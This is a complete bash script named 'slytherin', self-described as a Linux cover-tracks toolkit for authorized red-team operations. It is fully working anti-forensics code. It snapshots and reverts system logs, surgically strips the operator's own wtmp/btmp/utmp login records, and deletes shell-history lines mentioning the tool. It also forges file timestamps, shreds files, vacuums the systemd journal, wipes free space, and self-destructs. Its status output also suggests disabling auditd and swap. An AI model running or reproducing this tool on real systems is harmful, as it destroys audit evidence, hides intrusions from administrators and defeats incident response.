#!/usr/bin/env bash

TAG="[slytherin]"
MAX_SNAP=$((64 * 1024 * 1024))
UTMP_FAMILY=" utmp wtmp btmp "

SESSION=""

info() { printf '%s [+] %s\n' "$TAG" "$*"; }
warn() { printf '%s [!] %s\n' "$TAG" "$*"; }
die()  { printf '%s [-] %s\n' "$TAG" "$*"; exit 1; }

_fmt() { printf '%s\n' "$1" | sed -e ':a' -e 's/\B[0-9]\{3\}\>/,&/' -e 'ta'; }

_meta_path()    { printf '%s/meta' "$SESSION"; }
_start_path()   { printf '%s/start' "$SESSION"; }
_pkgbase_path() { printf '%s/pkgbase' "$SESSION"; }

expanduser() {
  local p=$1 rest name h
  case $p in
    '~')   printf '%s\n' "$HOME"; return ;;
    '~'/*) printf '%s\n' "$HOME${p#\~}"; return ;;
    '~'*)
      rest=${p#\~}; name=${rest%%/*}
      h=$(getent passwd "$name" 2>/dev/null | cut -d: -f6)
      if [ -n "$h" ]; then printf '%s\n' "$h${rest#"$name"}"; else printf '%s\n' "$p"; fi ;;
    *) printf '%s\n' "$p" ;;
  esac
}

build_paths() {
  local pats=()
  pats+=(
    "/var/log/lastlog" "/var/log/faillog" "/var/log/dmesg" "/var/run/utmp"
    "/var/log/auth*" "/var/log/syslog*" "/var/log/daemon*" "/var/log/kern*"
    "/var/log/messages*" "/var/log/secure*" "/var/log/mail*" "/var/log/maillog*"
    "/var/log/cron*" "/var/log/boot*" "/var/log/mysqld.log*" "/var/log/yum.log*"
    "/var/log/btmp*" "/var/log/wtmp*" "/var/log/utmp*"
    "/var/log/audit/*.log*" "/var/log/httpd/*" "/var/log/lighttpd/*"
    "/var/log/ufw*"
    "/var/log/apt/history.log*" "/var/log/apt/term.log*" "/var/log/dpkg.log*"
    "/var/log/aptitude*" "/var/log/eipp.log*"
    "/var/log/apache2/*" "/var/log/mysql/*" "/var/log/mariadb/*"
    "/opt/lampp/logs/*" "/opt/lampp/var/mysql/*.err"
    "/var/log/anydesk*" "/var/log/anydesk/*"
    "/home/*/.anydesk/*" "/root/.anydesk/*"
    "/home/*/.local/share/recently-used.xbel" "/root/.local/share/recently-used.xbel"
    "/home/*/.local/share/gnome-shell/*" "/root/.local/share/gnome-shell/*"
    "/run/mount/utab"
    "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.sh_history" "$HOME/.python_history"
    "$HOME/.node_repl_history" "$HOME/.mysql_history" "$HOME/.lesshst" "$HOME/.viminfo"
    "$HOME/.ssh/known_hosts*"
  )
  local hist=(.bash_history .zsh_history .sh_history .python_history
              .node_repl_history .mysql_history .lesshst .viminfo)
  local home h
  for home in /home/* /root; do
    [ -d "$home" ] || continue
    for h in "${hist[@]}"; do pats+=("$home/$h"); done
    pats+=("$home/.ssh/known_hosts*")
  done

  local out=() seen=() p m dup s
  for p in "${pats[@]}"; do
    while IFS= read -r m; do
      [ -n "$m" ] || continue
      [ -f "$m" ] || continue
      dup=0
      for s in "${seen[@]}"; do [ "$s" = "$m" ] && { dup=1; break; }; done
      [ "$dup" = 0 ] || continue
      seen+=("$m"); out+=("$m")
    done < <(compgen -G "$p")
  done
  [ ${#out[@]} -gt 0 ] && printf '%s\n' "${out[@]}"
  return 0
}

_stat_ns() {
  local out
  out=$(stat -c "%.$2" "$1" 2>/dev/null)
  case $out in
    *.*) printf '%s\n' "$out" ;;
    *)   printf '%s.0\n' "$(stat -c "%$2" "$1")" ;;
  esac
}

snap() {
  mkdir -p -m 700 "$SESSION"
  SNAP_N=0
  local p abspath key idx size at mt dup
  for p in "$@"; do
    case $p in /*) abspath=$p ;; *) abspath="$(pwd -P)/$p" ;; esac
    if [ -s "$(_meta_path)" ] && awk -F'\t' -v q="$abspath" '$4==q{f=1} END{exit f?0:1}' "$(_meta_path)"; then
      continue
    fi
    [ -f "$p" ] || continue
    [ -r "$p" ] || continue
    size=$(stat -c %s "$p" 2>/dev/null) || { warn "cannot snapshot $p"; continue; }
    if [ "$size" -gt "$MAX_SNAP" ]; then
      warn "skipped (>64MB): $p"
      continue
    fi
    idx=0
    [ -f "$(_meta_path)" ] && idx=$(wc -l < "$(_meta_path)")
    idx=${idx:-0}; idx=$((idx))
    key=$(printf '%08x-%s' "$idx" "${p##*/}")
    at=$(_stat_ns "$p" X); mt=$(_stat_ns "$p" Y)
    if ! cp -p "$p" "$SESSION/$key" 2>/dev/null; then warn "cannot snapshot $p"; continue; fi
    printf '%s\t%s\t%s\t%s\n' "$key" "$at" "$mt" "$abspath" >> "$(_meta_path)"
    SNAP_N=$((SNAP_N+1))
  done
  return 0
}

_revert_times() {
  touch -a -d "@$2" "$1" 2>/dev/null
  touch -m -d "@$3" "$1" 2>/dev/null
}

_revert_file() {
  local blob="$SESSION/$2"
  [ -f "$blob" ] && cat "$blob" > "$1" 2>/dev/null
  _revert_times "$1" "$3" "$4"
}

restore() {
  RESTORE_N=0
  [ -f "$(_meta_path)" ] || return 0
  local key at mt path blob err skip w found
  while IFS=$'\t' read -r key at mt path || [ -n "$path" ]; do
    [ -n "$path" ] || continue
    skip=0
    for w in ${HANDLED[@]+"${HANDLED[@]}"}; do [ "$w" = "$path" ] && { skip=1; break; }; done
    [ "$skip" = 0 ] || continue
    if [ $# -gt 0 ]; then
      found=0
      for w in "$@"; do [ "$w" = "$path" ] && { found=1; break; }; done
      [ "$found" = 1 ] || continue
    fi
    blob="$SESSION/$key"
    if [ -f "$blob" ]; then
      if ! err=$(cat "$blob" > "$path" 2>&1); then warn "cannot restore $path: $err"; continue; fi
    fi
    if [ -e "$path" ]; then
      err=$(touch -a -d "@$at" "$path" 2>&1) || { warn "cannot restore $path: $err"; continue; }
      err=$(touch -m -d "@$mt" "$path" 2>&1) || { warn "cannot restore $path: $err"; continue; }
    fi
    RESTORE_N=$((RESTORE_N+1))
  done < "$(_meta_path)"
  return 0
}

_days_from_civil() {
  local y=$((10#$1)) m=$((10#$2)) d=$((10#$3))
  [ "$m" -le 2 ] && y=$((y-1))
  local era=$([ "$y" -ge 0 ] && echo $((y/400)) || echo $(((y-399)/400)))
  local yoe=$((y - era*400))
  local mp=$(( m + ( m > 2 ? -3 : 9 ) ))
  local doy=$(( (153*mp + 2)/5 + d - 1 ))
  local doe=$(( yoe*365 + yoe/4 - yoe/100 + doy ))
  printf '%s\n' $(( era*146097 + doe - 719468 ))
}

_epoch_utc() {
  local y=$1 mo=$2 d=$3 H=$4 M=$5 S=$6 rest=$7 off="" digits hh mm delta ep
  [[ $rest =~ [+-][0-9][0-9]:?[0-9][0-9] ]] && off="${BASH_REMATCH[0]}"
  ep=$(( $( _days_from_civil "$y" "$mo" "$d" ) * 86400 + 10#$H*3600 + 10#$M*60 + 10#$S ))
  if [ -n "$off" ]; then
    digits=${off:1}; digits=${digits/:/}
    hh=${digits:0:2}; mm=${digits:2:2}
    delta=$(( 10#$hh*3600 + 10#$mm*60 ))
    if [ "${off:0:1}" = "+" ]; then ep=$((ep - delta)); else ep=$((ep + delta)); fi
  fi
  printf '%s\n' "$ep"
}

_is_our_record() {
  local since=$1 user=$2 tty=$3 line=$4
  local rest="$line" fields=() f ts="" re
  while [[ $rest =~ \[([^\]]*)\] ]]; do
    fields+=("${BASH_REMATCH[1]}")
    rest="${rest#*\]}"
  done
  re='([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])[T ]([0-9][0-9]):([0-9][0-9]):([0-9][0-9])'
  for f in "${fields[@]}"; do
    if [[ $f =~ $re ]]; then
      ts=$(_epoch_utc "${BASH_REMATCH[1]}" "${BASH_REMATCH[2]}" "${BASH_REMATCH[3]}" \
                      "${BASH_REMATCH[4]}" "${BASH_REMATCH[5]}" "${BASH_REMATCH[6]}" \
                      "${f#*"${BASH_REMATCH[0]}"}")
      break
    fi
  done
  [ -z "$ts" ] && return 1
  [ "$((ts * 1000000000))" -lt "$since" ] && return 1
  for f in "${fields[@]}"; do [ "$f" = "$user" ] && return 0; done
  [ -n "$tty" ] || return 1
  for f in "${fields[@]}"; do [ "$f" = "$tty" ] && return 0; done
  return 1
}

strip_login_records() {
  STRIPPED=0
  local since
  since=$(cat "$(_start_path)" 2>/dev/null)
  [ -n "$since" ] || return 0
  [ -f "$(_meta_path)" ] || return 0
  local user tty t path key at mt base
  user=$(id -un 2>/dev/null) || user=""
  tty=""
  t=$(tty 2>/dev/null) || t=""
  case $t in /dev/*) tty=${t##*/} ;; esac
  while IFS=$'\t' read -r key at mt path || [ -n "$path" ]; do
    [ -n "$path" ] || continue
    base=${path##*/}
    case "$UTMP_FAMILY" in *" $base "*) ;; *) continue ;; esac
    [ -e "$path" ] || continue
    _strip_utmp_file "$path" "$at" "$mt" "$since" "$user" "$tty" || \
      _revert_file "$path" "$key" "$at" "$mt"
  done < "$(_meta_path)"
  return 0
}

_strip_utmp_file() {
  local path=$1 at=$2 mt=$3 since=$4 user=$5 tty=$6
  local all line keep="" dropped=0 rc
  all=$(utmpdump "$path" 2>/dev/null)
  if [ -n "$all" ]; then
    while IFS= read -r line || [ -n "$line" ]; do
      if _is_our_record "$since" "$user" "$tty" "$line"; then
        dropped=$((dropped+1))
      else
        keep+="$line"$'\n'
      fi
    done <<< "$all"
  fi
  if [ "$dropped" -eq 0 ]; then
    _revert_times "$path" "$at" "$mt"
    HANDLED+=("$path")
    return 0
  fi
  printf '%s' "$keep" | utmpdump -r > "$path" 2>/dev/null
  rc=$?
  [ "$rc" -ne 0 ] && return 1
  _revert_times "$path" "$at" "$mt"
  HANDLED+=("$path")
  STRIPPED=$((STRIPPED+dropped))
  return 0
}

strip_self() {
  SELF_STRIPPED=0
  local p total kept tmpf
  while IFS= read -r p; do
    [ -n "$p" ] || continue
    case $p in *history) ;; *) continue ;; esac
    [ -w "$p" ] || continue
    total=$(awk 'END{print NR}' "$p" 2>/dev/null) || continue
    kept=$(grep -vic slytherin "$p" 2>/dev/null); kept=${kept:-0}
    case $total in ''|*[!0-9]*) continue ;; esac
    case $kept  in ''|*[!0-9]*) continue ;; esac
    if [ "$kept" -lt "$total" ]; then
      tmpf="$p.sly$$"
      grep -vi slytherin "$p" 2>/dev/null > "$tmpf" && cat "$tmpf" > "$p"
      rm -f "$tmpf"
      SELF_STRIPPED=$((SELF_STRIPPED + total - kept))
    fi
  done < <(build_paths)
  return 0
}

nuke_session() {
  [ -d "$SESSION" ] || return 0
  find "$SESSION" -type f -print0 2>/dev/null | \
    while IFS= read -r -d '' fp; do
      local sz
      sz=$(stat -c %s "$fp" 2>/dev/null) || continue
      head -c "$sz" /dev/urandom > "$fp" 2>/dev/null
    done
  rm -rf "$SESSION"
  return 0
}

_parse_dpkg_list() {
  awk -F'\t' '$2 ~ /^ii/ {print $1}'
}

_dpkg_installed() {
  local out rc
  if command -v timeout >/dev/null 2>&1; then
    out=$(timeout 120 dpkg-query -W -f='${binary:Package}\t${db:Status-Abbrev}\n' 2>/dev/null)
  else
    out=$(dpkg-query -W -f='${binary:Package}\t${db:Status-Abbrev}\n' 2>/dev/null)
  fi
  rc=$?
  [ "$rc" -ne 0 ] && return "$rc"
  printf '%s\n' "$out" | _parse_dpkg_list
  return 0
}

_pkg_diff() {
  local cur
  cur=$(_dpkg_installed) || return 1
  comm -13 <(LC_ALL=C sort -u "$(_pkgbase_path)") <(printf '%s\n' "$cur" | LC_ALL=C sort -u)
}

_warn_pkg_leftovers() {
  [ -f "$(_pkgbase_path)" ] || return 0
  command -v dpkg-query >/dev/null 2>&1 || return 0
  local new
  new=$(_pkg_diff) || return 0
  [ -n "$new" ] && warn "$(printf '%s\n' $new | wc -w | tr -d ' ') package(s) installed during this session are still installed - review with 'slytherin pkg', purge with 'slytherin pkg --remove'"
  return 0
}

_require_session() {
  [ -d "$SESSION" ] || die "no session found at $SESSION - run 'slytherin start' first"
}

cmd_start() {
  if [ -d "$SESSION" ]; then
    warn "session already exists at $SESSION (run 'finish' first, or 'finish --discard')"
    return
  fi
  mkdir -p -m 700 "$SESSION"
  date +'%s.%N' > "$(_start_path)"
  local paths=() p
  while IFS= read -r p; do [ -n "$p" ] && paths+=("$p"); done < <(build_paths)
  snap ${paths[@]+"${paths[@]}"}
  info "session started: snapshot of $SNAP_N files in $SESSION"
  if command -v dpkg-query >/dev/null 2>&1; then
    if _dpkg_installed | LC_ALL=C sort -u > "$(_pkgbase_path).tmp" && \
       mv "$(_pkgbase_path).tmp" "$(_pkgbase_path)"; then
      info "package baseline recorded: $(wc -l < "$(_pkgbase_path)" | tr -d ' ') installed (for 'pkg' tracking)"
    else
      rm -f "$(_pkgbase_path).tmp"
      warn "package baseline failed - 'pkg' tracking unavailable this session: dpkg-query failed"
    fi
  else
    warn "dpkg-query not found - 'pkg' package tracking unavailable (non-Debian box?)"
  fi
  warn "actions taken by OTHER processes during this session will be reverted too (utmp/wtmp/btmp are surgically stripped instead)"
}

cmd_get() {
  _require_session
  snap "$1"
  if [ "$SNAP_N" -gt 0 ]; then
    info "recorded pre-state of $1 for revert at finish"
  else
    warn "nothing recorded for $1 (missing, or already in session)"
  fi
}

cmd_finish() {
  _require_session
  if [ "$DISCARD" = 1 ]; then
    nuke_session
    info "session discarded without restoring"
    return
  fi
  HANDLED=()
  strip_login_records
  if [ "${#HANDLED[@]}" -gt 0 ]; then
    local names="" h
    for h in "${HANDLED[@]}"; do names+="${h##*/}, "; done
    names=${names%, }
    info "surgically removed $STRIPPED login record(s) from: $names"
  fi
  restore
  local n=$RESTORE_N
  _warn_pkg_leftovers
  strip_self
  local s=$SELF_STRIPPED
  nuke_session
  info "restored $n files to pre-session state, stripped $s history line(s)"
  if [ -d /run/log/journal ] || [ -d /var/log/journal ]; then
    warn "journald detected - the binary journal is NOT snapshotted; run 'slytherin journald --vacuum 1s' if you need it trimmed"
  fi
  warn "the current shell will still append its buffered history on exit - run 'history -c && unset HISTFILE' before closing"
  if [ "$SELFDESTRUCT" = 1 ]; then
    local me=$0
    case $me in /*) ;; *) me="$(pwd -P)/$me" ;; esac
    if [ -f "$me" ]; then
      ( i=0
        while [ "$i" -lt 15 ] && kill -0 "$PPID" 2>/dev/null; do sleep 0.2; i=$((i+1)); done
        shred "$me" 3 1 0 >/dev/null 2>&1 && printf '%s [+] self-destructed: %s\n' "$TAG" "$me" ) &
    fi
  fi
}

cmd_status() {
  local total=0 writable=0 p size flag sz ap n
  while IFS= read -r p; do
    [ -n "$p" ] || continue
    if size=$(stat -c %s "$p" 2>/dev/null); then
      if [ -w "$p" ]; then flag=rw; writable=$((writable+1)); else flag=ro; fi
      sz="$(_fmt "$size") B"
    else
      flag=gone; sz=-
    fi
    printf '  %-3s %12s  %s\n' "$flag" "$sz" "$p"
    total=$((total+1))
  done < <(build_paths)
  printf '\n  %s trace file(s) found, %s writable as current user\n' "$total" "$writable"
  printf '  dry-run only - nothing was modified\n\n'
  if command -v pidof >/dev/null 2>&1; then
    ap=$(pidof auditd 2>/dev/null)
    [ -n "$ap" ] && warn "auditd is RUNNING (pid $ap) - kernel audit rules see everything; consider 'auditctl -e 0' before acting"
  fi
  if [ -d /run/log/journal ] || [ -d /var/log/journal ]; then
    info "journald detected - 'journald --vacuum' can trim the binary journal"
  fi
  n=0
  [ -f /proc/swaps ] && n=$(wc -l < /proc/swaps)
  n=${n:-0}
  [ "$((n))" -gt 1 ] && warn "swap is ACTIVE - memory fragments (keys, history) hit disk; 'swapoff -a' during the session, re-enable after"
  if command -v utmpdump >/dev/null 2>&1; then
    info "utmpdump available - finish surgically strips login records"
  else
    warn "utmpdump missing - login-record cleanup falls back to full revert"
  fi
  return 0
}

shred() {
  local f=$1 iters=$2 zero=$3 keep=$4 sz i tmp
  sz=$(stat -c %s "$f") || return 1
  for ((i = 0; i < iters; i++)); do
    head -c "$sz" /dev/urandom | dd of="$f" bs=1048576 conv=notrunc,fsync 2>/dev/null || return 1
  done
  if [ "$zero" = 1 ]; then
    head -c "$sz" /dev/zero | dd of="$f" bs=1048576 conv=notrunc,fsync 2>/dev/null || return 1
  fi
  if [ "$keep" != 1 ]; then
    tmp="$(dirname "$f")/.sly-$(head -c 8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
    mv "$f" "$tmp" || return 1
    rm -f "$tmp"
  fi
  printf '%s\n' "$sz"
}

cmd_shred() {
  local total=0 p f sz
  local files=()
  for p in "$@"; do
    p=$(expanduser "$p")
    files=()
    while IFS= read -r f; do [ -n "$f" ] && files+=("$f"); done < <(compgen -G "$p" | LC_ALL=C sort)
    if [ ${#files[@]} -eq 0 ] && [ -e "$p" ]; then files=("$p"); fi
    for f in "${files[@]}"; do
      [ -f "$f" ] || continue
      if sz=$(shred "$f" "$ITERS" "$ZERO" "$KEEP"); then
        total=$((total + sz))
        if [ "$KEEP" = 1 ]; then
          info "overwrote in place (--keep): $f"
        else
          info "shredded (${ITERS}x$([ "$ZERO" = 1 ] && printf '+zero')): $f"
        fi
      else
        warn "cannot shred $f"
      fi
    done
  done
  info "$(_fmt "$total") bytes overwritten"
}

parse_time() {
  local s=$1 re='^[0-9]{4}-[0-9]{2}-[0-9]{2}[T ][0-9]{2}:[0-9]{2}:[0-9]{2}$' ep
  [[ $s =~ $re ]] || return 1
  ep=$(date -d "$s" +%s 2>/dev/null) || return 1
  printf '%s\n' "$ep"
}

cmd_mace() {
  local targets=() found=() t f p a m label ep n i
  for p in "$@"; do
    p=$(expanduser "$p")
    found=()
    while IFS= read -r f; do [ -n "$f" ] && found+=("$f"); done < <(compgen -G "$p" | LC_ALL=C sort)
    [ ${#found[@]} -eq 0 ] && found=("$p")
    for f in "${found[@]}"; do
      if [ -f "$f" ] || { [ -d "$f" ] && [ "$RECURSE" = 1 ]; }; then
        targets+=("$f")
      elif [ -d "$f" ]; then
        warn "dir without --recurse skipped: $f"
      fi
    done
  done
  if [ "$RECURSE" = 1 ]; then
    local expanded=()
    for t in "${targets[@]}"; do
      if [ -d "$t" ]; then
        while IFS= read -r f; do expanded+=("$f"); done < <(find "$t" -type f)
      else
        expanded+=("$t")
      fi
    done
    targets=("${expanded[@]}")
  fi
  if [ "$VIEW" = 1 ]; then
    for t in "${targets[@]}"; do
      printf '  %s\n' "$t"
      printf '    Modified : %s\n' "$(date -d "@$(stat -c %Y "$t")" '+%a %b %e %H:%M:%S %Y')"
      printf '    Accessed : %s\n' "$(date -d "@$(stat -c %X "$t")" '+%a %b %e %H:%M:%S %Y')"
      printf '    Changed  : %s\n' "$(date -d "@$(stat -c %Z "$t")" '+%a %b %e %H:%M:%S %Y')"
    done
    return 0
  fi
  if [ -n "$DONOR" ] && [ -n "$TIME" ]; then
    die "--time and --from are mutually exclusive"
  fi
  local stamps_a=() stamps_m=()
  if [ -n "$DONOR" ]; then
    local d; d=$(expanduser "$DONOR")
    a=$(_stat_ns "$d" X 2>/dev/null) && m=$(_stat_ns "$d" Y 2>/dev/null) || die "donor not found: $DONOR"
    for t in "${targets[@]}"; do stamps_a+=("$a"); stamps_m+=("$m"); done
    label="donor $DONOR"
  elif [ -n "$TIME" ]; then
    ep=$(parse_time "$TIME") || die "unparseable time '$TIME' - use 'YYYY-MM-DD HH:MM:SS'"
    for t in "${targets[@]}"; do stamps_a+=("$ep.0"); stamps_m+=("$ep.0"); done
    label="$TIME"
  else
    die "provide --time 'YYYY-MM-DD HH:MM:SS', --from <donor>, or --view"
  fi
  n=0
  for i in ${targets[@]+"${!targets[@]}"}; do
    t=${targets[$i]}
    if touch -a -d "@${stamps_a[$i]}" "$t" 2>/dev/null && touch -m -d "@${stamps_m[$i]}" "$t" 2>/dev/null; then
      warn 'ctime not userspace-settable - for ctime on ext4 use: debugfs -w -R "set_inode_field <path> ctime <value>" <dev>'
      n=$((n+1))
    else
      warn "cannot stamp $t"
    fi
  done
  info "stamped $n file(s) -> $label"
}

cmd_journald() {
  command -v journalctl >/dev/null 2>&1 || die "journalctl not found - systemd-journald not present"
  journalctl --rotate >/dev/null 2>&1
  local out
  out=$(journalctl "--vacuum-time=$VACUUM" 2>/dev/null)
  [ -n "$out" ] && printf '%s\n' "$out"
  info "journald trimmed: rotated + vacuum-time=$VACUUM"
  warn "vacuum trims the LOCAL journal only - anything already forwarded to a SIEM is unaffected"
}

cmd_pkg() {
  _require_session
  command -v dpkg-query >/dev/null 2>&1 || die "dpkg-query not found - dpkg package tracking unavailable"
  [ -f "$(_pkgbase_path)" ] || die "no package baseline in this session (it is recorded at 'start')"
  local new p rc
  new=$(_pkg_diff) || die "cannot query dpkg: dpkg-query failed"
  if [ -z "$new" ]; then
    info "no packages installed during this session"
    return 0
  fi
  if [ "$PRINT_CMDS" = 1 ]; then
    printf 'apt-get purge -y %s\n' "$(echo $new)"
    return 0
  fi
  while IFS= read -r p; do printf '  %s\n' "$p"; done <<< "$new"
  if [ "$REMOVE" = 1 ]; then
    if command -v apt-get >/dev/null 2>&1; then
      DEBIAN_FRONTEND=noninteractive apt-get purge -y $new
      rc=$?
    else
      DEBIAN_FRONTEND=noninteractive dpkg --purge $new
      rc=$?
    fi
    if [ "$rc" -eq 0 ]; then
      info "purged $(printf '%s\n' $new | wc -w | tr -d ' ') session package(s) (deps included - they were session-installed too)"
    else
      warn "remover exited $rc - some may remain; review with 'pkg --print'"
    fi
  else
    info "$(printf '%s\n' $new | wc -w | tr -d ' ') package(s) installed during session - 'pkg --print' shows the purge command, 'pkg --remove' purges them"
  fi
}

cmd_changed() {
  _require_session
  local since
  since=$(cat "$(_start_path)" 2>/dev/null)
  [ -n "$since" ] || die "session has no start timestamp"
  local dirs=() d n=0 m f
  if [ "${#CHANGED_DIRS[@]}" -gt 0 ]; then dirs=("${CHANGED_DIRS[@]}"); else dirs=(/etc /opt /srv /var/www /root /home); fi
  for d in "${dirs[@]}"; do
    [ -d "$d" ] || continue
    while IFS=$'\t' read -r m f; do
      [ -n "$f" ] || continue
      printf '  %s  %s\n' "$(date -d "@${m%.*}" '+%Y-%m-%d %H:%M:%S')" "$f"
      n=$((n+1))
    done < <(find "$d" -type f \( -newermt "@$since" -o -newerct "@$since" \) -printf '%T@\t%p\n' 2>/dev/null)
  done
  info "$n file(s) changed since session start - 'get' + revert or 'mace' each before finish"
}

cmd_free() {
  local d=${FREE_DIR:-}
  [ -n "$d" ] || d="${TMPDIR:-/tmp}"
  local cap="" fn="$d/.slytherin-wipe-$$" written=0
  [ -n "$FREE_MB" ] && cap=$((FREE_MB * 1024 * 1024))
  while :; do
    dd if=/dev/urandom of="$fn" bs=4194304 count=1 oflag=append conv=notrunc 2>/dev/null || break
    written=$((written + 4194304))
    [ -n "$cap" ] && [ "$written" -ge "$cap" ] && break
  done
  sync "$fn" 2>/dev/null || sync 2>/dev/null
  rm -f "$fn" 2>/dev/null
  info "free-space wipe: $(_fmt "$written") bytes overwritten in $d"
  warn "defeats naive recovery only - SSD wear-leveling keeps remnants"
}

cmd_selftest() {
  local tmp old_session old a b c got
  tmp=$(mktemp -d "${TMPDIR:-/tmp}/slytherin-test-XXXXXX")
  old_session=$SESSION
  SESSION="$tmp/.sess"
  _selftest_fail() { rm -rf "$tmp" 2>/dev/null; SESSION=$old_session; die "selftest FAILED: $1"; }
  a="$tmp/auth.log"; b="$tmp/wtmp"
  printf 'line1\n' > "$a"; printf 'wb\n' > "$b"
  old=$(( $(date +%s) - 86400 * 30 ))
  touch -d "@$old" "$a" "$b"
  snap "$a" "$b"
  [ "$SNAP_N" = 2 ] || _selftest_fail "snapshot count"
  printf 'evil-trace\n' >> "$a"
  touch -d "@0" "$a"
  restore "$a" "$b"
  [ "$RESTORE_N" = 2 ] || _selftest_fail "restore count"
  printf 'line1\n' > "$tmp/.exp1"; printf 'wb\n' > "$tmp/.exp2"
  cmp -s "$a" "$tmp/.exp1" || _selftest_fail "content restore failed"
  cmp -s "$b" "$tmp/.exp2" || _selftest_fail "content restore failed (b)"
  [ "$(stat -c %Y "$a")" = "$old" ] || _selftest_fail "mtime restore failed"
  c="$tmp/shredme"
  head -c 100 /dev/zero | tr '\0' 'x' > "$c"
  shred "$c" 2 1 0 >/dev/null || _selftest_fail "shred errored"
  [ ! -e "$c" ] || _selftest_fail "shred failed"
  for f in "$tmp"/.sly-*; do [ -e "$f" ] && _selftest_fail "shred left renamed file"; done
  local since=1735689600000000000
  _is_our_record "$since" root pts/2 "[7] [1234] [pts/2] [ts/2] [root] [10.0.0.1] [2025-01-02T10:00:00,000000+00:00]" \
    || _selftest_fail "own record"
  _is_our_record "$since" root pts/2 "[7] [9999] [pts/3] [ts/3] [alice] [10.0.0.2] [2025-01-02T11:00:00,000000+00:00]" \
    && _selftest_fail "other user kept"
  _is_our_record "$since" root pts/2 "[7] [1111] [pts/1] [ts/1] [root] [10.0.0.1] [2024-12-31T10:00:00,000000+00:00]" \
    && _selftest_fail "pre-session kept"
  _is_our_record "$since" root pts/2 "[7] [2222] [pts/4] [ts/4] [root] [not-a-date]" \
    && _selftest_fail "unparseable kept"
  got=$(printf 'libc6:amd64\tii \nremoved\trc \nhalf\thi \napt\tii \nunpack\tiU \n' | _parse_dpkg_list | LC_ALL=C sort)
  [ "$got" = "$(printf 'apt\nlibc6:amd64')" ] || _selftest_fail "dpkg parse"
  nuke_session
  [ ! -d "$SESSION" ] || _selftest_fail "session cleanup failed"
  rm -rf "$tmp"
  SESSION=$old_session
  info "selftest PASS (snapshot/revert, mtime revert, shred+zero+rename, utmp record filter, dpkg parse, session cleanup)"
}

usage() {
  cat <<'EOF'
usage: slytherin [-h] {start,get,finish,status,shred,mace,journald,pkg,changed,free,selftest} ...

Linux cover-tracks toolkit for authorized red-team operations

commands:
  start       snapshot logs+timestamps of this session
  get         record pre-state of one file mid-session
  finish      revert logs+timestamps, strip history, remove session
  status      dry-run: list trace files, writability + environment intel
  shred       random-overwrite files N times, rename, then unlink
  mace        rewrite timestamps (atime/mtime; ctime needs debugfs)
  journald    trim the systemd binary journal (rotate + vacuum)
  pkg         packages installed during this session (dpkg)
  changed     list files modified since session start
  free        overwrite unallocated space
  selftest    run built-in verification

options:
  -h, --help  show this help message and exit

Authorized use only. Dry-run first with 'status'. 'start' before acting, 'finish' after.
EOF
}

usage_err() { usage >&2; exit 2; }

main() {
  local tmpdir="${TMPDIR:-/tmp}"
  SESSION="${tmpdir%/}/.slytherin-$(id -u)"
  [ $# -ge 1 ] || usage_err
  local cmd=$1; shift
  case $cmd in
    -h|--help) usage; exit 0 ;;
  esac
  local paths=()
  case $cmd in
    start)
      [ $# -eq 0 ] || usage_err
      cmd_start ;;
    get)
      [ $# -eq 1 ] || usage_err
      cmd_get "$1" ;;
    finish)
      DISCARD=0; SELFDESTRUCT=0
      while [ $# -gt 0 ]; do
        case $1 in
          --discard) DISCARD=1 ;;
          --selfdestruct) SELFDESTRUCT=1 ;;
          *) usage_err ;;
        esac
        shift
      done
      cmd_finish ;;
    status)
      [ $# -eq 0 ] || usage_err
      cmd_status ;;
    shred)
      ITERS=3; ZERO=0; KEEP=0
      while [ $# -gt 0 ]; do
        case $1 in
          --) shift; while [ $# -gt 0 ]; do paths+=("$1"); shift; done; break ;;
          -n|--iterations) [ $# -ge 2 ] || usage_err; ITERS=$2; shift ;;
          -z|--zero) ZERO=1 ;;
          --keep) KEEP=1 ;;
          -?*) usage_err ;;
          *) paths+=("$1") ;;
        esac
        shift
      done
      [ ${#paths[@]} -gt 0 ] || usage_err
      cmd_shred "${paths[@]}" ;;
    mace)
      TIME=""; DONOR=""; RECURSE=0; VIEW=0
      while [ $# -gt 0 ]; do
        case $1 in
          --) shift; while [ $# -gt 0 ]; do paths+=("$1"); shift; done; break ;;
          -t|--time) [ $# -ge 2 ] || usage_err; TIME=$2; shift ;;
          --from) [ $# -ge 2 ] || usage_err; DONOR=$2; shift ;;
          -r|--recurse) RECURSE=1 ;;
          -v|--view) VIEW=1 ;;
          -?*) usage_err ;;
          *) paths+=("$1") ;;
        esac
        shift
      done
      [ ${#paths[@]} -gt 0 ] || usage_err
      cmd_mace "${paths[@]}" ;;
    journald)
      VACUUM="1s"
      while [ $# -gt 0 ]; do
        case $1 in
          --vacuum) [ $# -ge 2 ] || usage_err; VACUUM=$2; shift ;;
          *) usage_err ;;
        esac
        shift
      done
      cmd_journald ;;
    pkg)
      PRINT_CMDS=0; REMOVE=0
      while [ $# -gt 0 ]; do
        case $1 in
          --print) PRINT_CMDS=1 ;;
          --remove) REMOVE=1 ;;
          *) usage_err ;;
        esac
        shift
      done
      cmd_pkg ;;
    changed)
      CHANGED_DIRS=()
      if [ "${1:-}" = "--dir" ]; then
        shift
        while [ $# -gt 0 ] && [ "${1#-}" = "$1" ]; do CHANGED_DIRS+=("$1"); shift; done
      fi
      [ $# -eq 0 ] || usage_err
      cmd_changed ;;
    free)
      FREE_DIR=""; FREE_MB=""
      while [ $# -gt 0 ]; do
        case $1 in
          --dir) [ $# -ge 2 ] || usage_err; FREE_DIR=$2; shift ;;
          --mb) [ $# -ge 2 ] || usage_err; FREE_MB=$2; shift ;;
          *) usage_err ;;
        esac
        shift
      done
      cmd_free ;;
    selftest)
      [ $# -eq 0 ] || usage_err
      cmd_selftest ;;
    *)
      usage_err ;;
  esac
}

main "$@"
